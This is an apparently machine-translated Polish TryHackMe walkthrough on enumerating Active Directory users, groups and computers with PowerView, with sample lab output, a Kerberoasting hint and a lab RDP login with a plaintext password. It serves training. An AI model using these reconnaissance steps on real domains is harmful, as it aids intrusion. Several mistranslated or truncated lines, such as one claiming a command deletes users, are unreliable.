W zadaniu 3. zapoznaliśmy się z różnymi wbudowanymi narzędziami systemu Windows, takimi jak `net`i `whoami`. W tym zadaniu przyjrzymy się PowerView, który jest częścią [frameworka PowerSploit.(otwiera się w nowej karcie)](https://github.com/PowerShellMafia/PowerSploit)Ten framework został napisany w programie PowerShell i może być używany do różnych zadań, od enumeracji użytkowników po odkrywanie relacji zaufania. Dla Twojej wygody, framework PowerSploit jest dostępny w wersji `C:\Users\asrepuser1\Downloads\PowerSploit-master`. Jego struktura katalogów pozwala zorientować się w dostępnych w nim narzędziach, jak pokazano poniżej:

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1\Downloads\PowerSploit-master> tree
Folder PATH listing
Volume serial number is AC34-24B4
C:.
├───AntivirusBypass
├───CodeExecution
│   └───Invoke-ReflectivePEInjection_Resources
├───docs
│   ├───AntivirusBypass
│   ├───CodeExecution
│   ├───Mayhem
│   ├───Persistence
│   ├───Privesc
│   ├───Recon
│   └───ScriptModification
├───Exfiltration
│   ├───LogonUser
│   └───NTFSParser
├───Mayhem
├───Persistence
├───Privesc
├───Recon
│   └───Dictionaries
├───ScriptModification
└───Tests
```

PowerView to narzędzie PowerShell do enumeracji domen. Jest to ewolucja narzędzi takich jak `net user`PowerView i PowerView `net group`. Należy pamiętać, że to zadanie zakłada, że ​​PowerView jest już pobrany i dostępny, a przynajmniej `PowerView.ps1`skrypt. Można go znaleźć w `Recon`katalogu frameworka PowerSploit, tj. w `C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon`.

### Wyliczanie użytkowników

Zacznijmy od uruchomienia programu PowerShell, przejścia do folderu, w którym dostępny jest program PowerSploit, a następnie do tego `Recon`folderu. Następnie wydajemy polecenie `Import-Module .\PowerView.ps1`. Pomyślny import modułu oznacza brak komunikatu o błędzie, jak pokazano w terminalu poniżej. Po załadowaniu modułu PowerView możemy wydawać polecenia takie jak `Get-DomainUser`lub , `Get-DomainUser`aby usunąć wszystkich użytkowników domeny.

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon> Import-Module .\PowerView.ps1 
PS C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon> Get-DomainUser 

logoncount             : 101
badpasswordtime        : 01/05/2025 12:59:29
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=tryhackme,DC=loc
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 14/05/2025 15:36:39
name                   : Administrator
objectsid              : S-1-5-21-1966530601-3185510712-10604624-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 01/01/1601 00:00:00
countrycode            : 0
whenchanged            : 14/05/2025 14:36:39
instancetype           : 4
objectguid             : dafecc0e-a826-483b-a12d-b253596507af
lastlogon              : 16/05/2025 20:50:57
lastlogoff             : 01/01/1601 00:00:00
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata  : {02/04/2025 15:49:41, 02/04/2025 15:49:41, 02/04/2025 15:14:22, 01/01/1601 18:12:16}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tryhackme,DC=loc, CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc, CN=Enterprise  
                         Admins,CN=Users,DC=tryhackme,DC=loc, CN=Schema Admins,CN=Users,DC=tryhackme,DC=loc...}
whencreated            : 02/04/2025 15:13:15
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 30/04/2025 16:34:11
usnchanged             : 81962
[...]
```

Ponieważ lista jest długa, możesz chcieć filtrować dane wyjściowe według nazwy użytkownika. Na przykład, aby wyświetlić nazwy użytkowników, które się `admin`w nich znajdują, możemy określić `*admin*`.

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon> Get-DomainUser *admin*

logoncount             : 101
badpasswordtime        : 01/05/2025 12:59:29
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=tryhackme,DC=loc
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 14/05/2025 15:36:39
name                   : Administrator
objectsid              : S-1-5-21-1966530601-3185510712-10604624-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 01/01/1601 00:00:00
countrycode            : 0
whenchanged            : 14/05/2025 14:36:39
instancetype           : 4
objectguid             : dafecc0e-a826-483b-a12d-b253596507af
lastlogon              : 16/05/2025 20:50:57
lastlogoff             : 01/01/1601 00:00:00
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata  : {02/04/2025 15:49:41, 02/04/2025 15:49:41, 02/04/2025 15:14:22, 01/01/1601 18:12:16}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tryhackme,DC=loc, CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc, CN=Enterprise        
                         Admins,CN=Users,DC=tryhackme,DC=loc, CN=Schema Admins,CN=Users,DC=tryhackme,DC=loc...}
whencreated            : 02/04/2025 15:13:15
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 30/04/2025 16:34:11
usnchanged             : 81962
```

Dla porównania, `net user /domain`PowerView wyświetla jedynie nazwy użytkowników z ograniczonym formatowaniem i filtrowaniem. Ponadto, ponieważ PowerView korzysta z programu PowerShell,

### Wyliczenie grup

Podobnie jak w przypadku `Get-DomainUser`, możemy użyć `Get-DomainGroup`(lub `Get-NetGroup`), aby uzyskać listę wszystkich grup utworzonych w domenie Active Directory. Ponadto możemy filtrować dane wejściowe, określając nasze kryteria. Na przykład, aby wyświetlić grupy z „admin” w nazwie, możemy użyć`Get-DomainGroup "*admin*"`

Windows PowerShell

```shell-session
PS C:\Users\Strategos\Downloads\PowerSploit-master\Recon> Get-DomainGroup "*admin*"

grouptype              : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : ALIAS_OBJECT
samaccountname         : Administrators
whenchanged            : 30/04/2025 15:30:54
objectsid              : S-1-5-32-544
objectclass            : {top, group}
cn                     : Administrators
usnchanged             : 21195
systemflags            : -1946157056
name                   : Administrators
dscorepropagationdata  : {02/04/2025 15:49:41, 02/04/2025 15:14:22, 01/01/1601 00:04:16}
description            : Administrators have complete and unrestricted access to the computer/domain 
distinguishedname      : CN=Administrators,CN=Builtin,DC=tryhackme,DC=loc
member                 : {CN=drgonz0,OU=IT,OU=People,DC=tryhackme,DC=loc, CN=empanadal0v3r,OU=IT,OU=People,DC=tryhackme,DC=loc,
                         CN=Strategos,OU=IT,OU=People,DC=tryhackme,DC=loc, CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc...}
usncreated             : 8199
whencreated            : 02/04/2025 15:13:15
instancetype           : 4
objectguid             : 124e52db-53be-4d69-b30b-3b283ffeb8ad
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
[...]
```

Bez dostępu do tego polecenia PowerView, konieczne jest skorzystanie z `net group`. Chociaż `net group /domain`wyświetli ono wszystkie grupy domen, będzie to tylko lista; do pobrania dalszych informacji, takich jak `net group "Domain Admins" /domain`., potrzebne jest inne polecenie.

### Wyliczanie komputerowe

Skoro już wypróbowałeś `Get-DomainUser`i `Get-DomainGroup`, czy potrafisz odgadnąć polecenie, które wylicza komputery przyłączone do domeny? Masz rację, jeśli myślałeś `Get-DomainComputer`(lub `Get-NetComputer`).

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon> Get-DomainComputer 

pwdlastset                    : 02/05/2025 17:05:27
logoncount                    : 192
msds-generationid             : {57, 144, 38, 236...}
serverreferencebl             : CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tryhackme,DC=loc
badpasswordtime               : 01/01/1601 00:00:00
distinguishedname             : CN=DC,OU=Domain Controllers,DC=tryhackme,DC=loc
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 09/05/2025 18:27:37
name                          : DC
objectsid                     : S-1-5-21-1966530601-3185510712-10604624-1008
samaccountname                : DC$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 09/05/2025 17:27:37
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Datacenter
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tryhackme,DC=loc
objectguid                    : cb0872a5-b418-4354-961e-6ee4bf96efff
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata         : {02/04/2025 15:14:22, 01/01/1601 00:00:01}
serviceprincipalname          : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.tryhackme.loc, ldap/DC.tryhackme.loc/ForestDnsZones.tryhackme.loc,  
                                ldap/DC.tryhackme.loc/DomainDnsZones.tryhackme.loc, TERMSRV/DC...}
usncreated                    : 12293
lastlogon                     : 16/05/2025 20:44:34
badpwdcount                   : 0
cn                            : DC
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 02/04/2025 15:14:21
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 61470
ridsetreferences              : CN=RID Set,CN=DC,OU=Domain Controllers,DC=tryhackme,DC=loc
dnshostname                   : DC.tryhackme.loc
```

### Więcej przykładów

Istnieje wiele innych przykładów, w których PowerView może być bardzo przydatny. Wymienimy kilka kolejnych:

- `Get-DomainUser -AdminCount`zwróci listę użytkowników domeny, którzy mają uprawnienia administratora.
- `Get-DomainUser -SPN`wyświetla konta z nazwami głównymi usług innymi niż null (SPN). Można je brać pod uwagę w przypadku ataków Kerberoasting.

Polecamy [oficjalną dokumentację(otwiera się w nowej karcie)](https://powersploit.readthedocs.io/en/latest/Recon/)aby poznać więcej poleceń i opcji.

xfreerdp /v:10.211.12.20 /u:rduke /p:Password1\! /dynamic-resolution
(Get-ADComputer -Filter *).Count

(Get-ADGroup -Filter {Name -like "*admin*"}).Count

Ten pokój podążał za[OGŁOSZENIE:](https://tryhackme.com/room/adbasicenumeration) Pomieszczenie do podstawowej ewidencji. W tym pomieszczeniu skupiliśmy się na różnych czynnościach ewidencji i rozpoznania, które wymagają uwierzytelnionego konta.

Przeanalizowaliśmy różne narzędzia wiersza poleceń, takie jak pakiet poleceń NET i dwaPowerShellModuły: ActiveDirectory firmy Microsoft i PowerView firmy PowerSploit. Użyliśmy również BloodHound do wizualizacji różnych relacji w Active Directory.
